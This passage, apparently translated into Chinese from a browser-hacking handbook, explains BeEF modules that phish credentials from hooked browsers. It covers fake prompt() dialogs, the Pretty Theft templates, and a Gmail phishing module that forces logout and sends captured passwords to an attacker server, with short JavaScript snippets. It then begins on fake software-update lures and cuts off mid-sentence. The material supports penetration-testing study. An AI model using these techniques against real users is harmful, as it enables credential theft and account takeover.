
如果你已经监听键盘事件，你可能会想，为什么还要通过其他方式获取用户名和密码。毕竟，你已经能看到所有的键盘输入了，对吗？捕获 DOM 关键字事件的有效性完全取决于钩子在应用程序中的位置。

例如，如果初始钩子是通过 Web 应用程序登录页面的 XSS 漏洞注入的，那么监听 DOM 关键字事件可能会泄露用户的用户名和密码。遗憾的是，这并非总是如此；在很多情况下，你可能只能在用户已认证之后才将钩子注入浏览器。当然，此时你可能能够获取当前会话 Cookie，甚至使用 BeEF 的 Tunneling Proxy 利用该会话，但这并不能让你轻松在后续阶段登录该应用程序。

除了能够冒充不懂情况的用户重新认证之外，获取用户密码的副本也带来其他好处。密码复用是依赖单因素、基于密码的认证系统的核心问题。在这种情况下，如果你能获取用户的密码，你可能会利用该秘密在多个系统上冒充该用户。

这些网络钓鱼攻击的影响在一定程度上取决于初始钩子的上下文。遗憾的是，大多数用户仍会在所有警报响起的同时提交他们的信息。这也是传统网络钓鱼诈骗仍然能够有效获取银行凭据的部分原因。如果你能让足够多的人访问该网站，你仍然可以骗几个人透露他们的敏感信息。

使用 JavaScript 的 prompt() 函数在用户的浏览会话中加载一个假登录提示非常简单，如下所示：

```
var answer = prompt("Your session has expired. 
  Please re-enter your password:");
```

执行后，会出现一个对话框，类似于 [Figure 5-13](#c05.html#figure5-13)。

 start figure 

[**Figure 5-13:**](#c05.html#figureanchor5-13) Prompt dialog box

![c05f013.tif](image_fi/662090c05/c05f013.png)

 end figure 

answer 变量随后可以提交回攻击者，但使用这种方法并不高效。对话框显然位置不当，且未与原始网站品牌化，同时你会发现该输入框不会像大多数密码对话框那样遮盖输入字符。

### Pretty Theft

当然，如果你能在当前钩子的源域中插入任意内容，那么你就没有理由不能显示一个更逼真的登录对话框。这就是 BeEF 中的“Pretty Theft”模块所做的事。

该模块提供了一系列预设的网络钓鱼模板，包括针对以下常见服务的模板：

*   Facebook

*   LinkedIn

*   YouTube

*   Yammer

对于其他情况，该模块还提供一个通用模式，允许在对话框中插入自定义图片。

该模块使用类似的深色模态对话框，并在执行后启动一个定时器，持续检查用户名和密码提示的更新。[Figure 5-14](#c05.html#figure5-14) 展示了该模块在通用模式下的样子，而 [Figure 5-15](#c05.html#figure5-15) 展示了该模块在 Facebook 模式下的样子。你可以在 [https://browserhacker.com](https://browserhacker.com) 查看完整的模块代码。

 start figure 

[**Figure 5-14:**](#c05.html#figureanchor5-14) Pretty Theft module in generic mode

![c05f014.tif](image_fi/662090c05/c05f014.png)

 end figure  start figure 

[**Figure 5-15:**](#c05.html#figureanchor5-15) Pretty Theft module in Facebook mode

![c05f015.tif](image_fi/662090c05/c05f015.png)

 end figure 

### Gmail Phishing

另一个显然是这些动态嵌入式网络钓鱼诈骗的热门目标是 Gmail。截至 2012 年 6 月，Google 的邮件服务被认为是最流行的网络邮件平台，超过了当时的 Hotmail，达到惊人的 4.25 亿用户，而 Hotmail 当时仅有 3.6 亿用户。21 如此多的用户意味着巨大的攻击面，因此“Gmail Phishing”模块应运而生。该 BeEF 模块由 @floyd_ch 开发，与早前的模块类似，但其执行方式略有不同。首次执行时，模块会执行以下操作：

```
document.title = "Google Mail: Email from Google";
beef.browser.changeFavicon("https://mail.google.com/favicon.ico");
logoutGoogle();
displayPhishingSite();
```

网络钓鱼是通过更新当前文档的标题，然后更新图标为 Google 的 favicon.ico 文件来实现的。logoutGoogle() 函数会启动一个无限循环，持续请求 Google 的注销函数，该函数缺乏 XSRF 防护机制，因此会在没有任何质疑的情况下注销当前已登录用户。这将在用户已登录时将其注销，或者如果用户尝试在其他地方登录则保持其注销状态。displayPhishingSite() 函数随后会将当前 document.body 元素重置为网络钓鱼内容，如 [Figure 5-16](#c05.html#figure5-16) 所示。

 start figure 

[**Figure 5-16:**](#c05.html#figureanchor5-16) Gmail Phishing

![c05f016.eps](image_fi/662090c05/c05f016.png)

 end figure 

当目标将其数据输入登录提示时，模块会将凭据发送回 BeEF 服务器，尝试打开一个新窗口并再次钩住 BeEF，最后将用户重定向回 Google 登录页面。由于之前的注销功能，目标会看起来像是在同一页面上（即网络钓鱼内容）重新输入凭据，仿佛第一次输入错误一样。以下代码片段展示了该逻辑：

```
window.open(http://browserhacker.com/rehook.html);
window.focus();
window.location = "https://accounts.google.com/ServiceLoginAuth";
```

你可以在 [https://browserhacker.com](https://browserhacker.com) 或维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) 查看该模块的完整代码。

### 使用假软件更新

在攻击目标组织时，你通常需要跳出浏览器的范围，直接针对目标计算机进行攻击。为了获得立足之地，你可能需要先利用目标的信任。

安全专业人士（包括本文作者）经常提醒大众，保持软件更新至关重要，尤其是当有未安装的安全补丁时。但实际上，即使采取了这些预防措施，在面对零日漏洞时，这些措施往往也不足，尤其是用户在弹出提示要求更新不安全软件时，往往会不假思索地点击“安装”或“确认”按钮。利用用户想要快速完成任务的心理，是利用信任的绝佳方式，不仅能让你进入目标系统，还能将其彻底打开。

罪犯常用相同的手段分发假安全软件或恶意软件。例如，一个对话框会提示用户安全软件已过时，必须安装最新版本。实际下载的软件并非所见，通常包含恶意载荷或假冒防病毒软件，需要付费才能激活。如果受害者提交了支付信息，诈骗就成功了。

有时为了让假对话框更具焦点，可以先使用全屏模态对话框或窗口遮 darkened 屏幕。以下 JavaScript 函数将帮助你实现这一点：

